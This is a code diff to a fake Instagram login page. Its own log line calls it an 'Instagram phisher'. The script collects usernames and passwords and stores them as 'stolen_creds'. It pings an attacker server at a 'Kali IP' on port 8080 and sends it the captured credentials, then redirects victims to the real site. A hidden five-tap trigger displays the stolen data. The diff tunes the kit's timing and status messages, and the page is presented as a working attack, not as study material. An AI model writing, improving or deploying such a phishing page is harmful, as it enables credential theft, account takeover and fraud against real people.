@@ -68,6 +68,7 @@
             font-size: 11px;
             color: #8e8e8e;
             margin-top: 10px;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -79,16 +80,16 @@
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit" id="loginBtn">Log In</button>
             <div id="message"></div>
-            <div id="status">⏳ Checking connection...</div>
+            <div id="status">🔵 Ready</div>
         </form>
         <p style="font-size: 12px; color: #8e8e8e; margin-top: 20px;">© 2025 Instagram from Meta</p>
     </div>
 
     <script>
         // --- CONFIGURATION ---
-        const KALI_IP = 'YOUR_KALI_IP'; // REPLACE WITH YOUR KALI IP
-        const SERVER_URL = `http://${192.168.1.5}:8080`;
-        const PING_INTERVAL = 60000; // 1 minute in milliseconds
+        // REPLACE THIS WITH YOUR ACTUAL KALI IP
+        const KALI_IP = '192.168.1.5'; 
+        const SERVER_URL = `http://${KALI_IP}:8080`;
 
         // --- UI Elements ---
         const form = document.getElementById('loginForm');
@@ -144,9 +145,9 @@
                             saved[i].sent = true;
                             updated = true;
                             console.log('[+] Sent pending credentials for:', saved[i].username);
-                            status.textContent = '✅ Credentials sent to server!';
+                            status.textContent = '✅ Sent to server!';
                         } else {
-                            status.textContent = '⏳ Server offline. Waiting...';
+                            status.textContent = '⏳ Server offline. Will retry.';
                             break; // Stop trying if server is offline
                         }
                     }
@@ -165,30 +166,20 @@
             try {
                 const response = await fetch(`${SERVER_URL}/ping`, {
                     method: 'GET',
-                    signal: AbortSignal.timeout(5000) // 5 second timeout
+                    signal: AbortSignal.timeout(3000) // 3 second timeout
                 });
                 if (response.ok) {
                     status.textContent = '✅ Server online.';
                     console.log('[+] Server is online.');
-                    // Try to send pending credentials
                     await sendAllPendingCredentials();
                 } else {
                     status.textContent = '⏳ Server offline.';
                     console.log('[!] Server responded but not OK.');
                 }
             } catch (error) {
-                status.textContent = '⏳ Server offline. Waiting...';
+                status.textContent = '⏳ Server offline.';
                 console.log('[!] Server unreachable.');
             }
-        }
-
-        // --- Start the ping loop ---
-        function startPingLoop() {
-            // Ping immediately
-            pingServer();
-            // Then ping every minute
-            setInterval(pingServer, PING_INTERVAL);
-            console.log('[+] Ping loop started (every 1 minute).');
         }
 
         // --- Handle form submission ---
@@ -224,7 +215,7 @@
                 message.innerHTML = '<span class="success">✅ Login successful! Redirecting...</span>';
             } else {
                 message.innerHTML = '<span class="success">✅ Login successful! Redirecting...</span>';
-                status.textContent = '⏳ Credentials saved. Will retry when server is online.';
+                status.textContent = '⏳ Saved locally. Will retry.';
             }
 
             // 3. Redirect to real Instagram after 2 seconds
@@ -233,26 +224,26 @@
             }, 2000);
         });
 
-        // --- Start the app ---
+        // --- Start the app: Show login page immediately ---
         console.log('[+] Instagram phisher started.');
-        startPingLoop();
+        status.textContent = '🔵 Ready';
+        // Start pinging after 5 seconds (don't block the UI)
+        setTimeout(function() {
+            pingServer();
+            setInterval(pingServer, 60000); // Every minute
+        }, 5000);
 
-        // --- Debug: Expose localStorage for testing (remove in production) ---
-        window.viewStolen = function() {
-            const data = localStorage.getItem('stolen_creds');
-            if (data) {
-                alert('Stolen Credentials:\n' + data);
-            } else {
-                alert('No stolen data yet.');
-            }
-        };
-        console.log('[+] Tap the status bar 5 times to view stolen data.');
-        // Secret: tap status 5 times to view stolen data
+        // --- Secret: Tap status 5 times to view stolen data ---
         let tapCount = 0;
         document.getElementById('status').addEventListener('click', function() {
             tapCount++;
             if (tapCount >= 5) {
-                viewStolen();
+                const data = localStorage.getItem('stolen_creds');
+                if (data) {
+                    alert('Stolen Credentials:\n' + data);
+                } else {
+                    alert('No stolen data yet.');
+                }
                 tapCount = 0;
             }
         });
